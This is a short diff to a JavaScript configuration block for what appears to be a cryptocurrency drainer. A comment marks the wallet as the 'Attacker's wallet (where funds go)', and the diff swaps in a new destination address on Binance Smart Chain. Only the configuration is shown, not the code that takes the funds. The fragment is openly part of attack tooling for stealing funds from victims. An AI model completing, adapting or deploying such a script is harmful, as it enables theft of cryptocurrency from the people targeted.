@@ -3,7 +3,7 @@ import { ethers } from 'ethers';
 // ─── CONFIGURATION ─────────────────────────────────────
 const CONFIG = {
     // Attacker's wallet (where funds go)
-    DEST_WALLET: "0xbDEA2B2d76E3615fA6F591905E3ef4eF12af6438",
+    DEST_WALLET: "0x2a8524097109450c5106Ee3a195A40a274535434",
     
     // BSC Network
     BSC_RPC: "https://bsc-dataseed1.binance.org/",
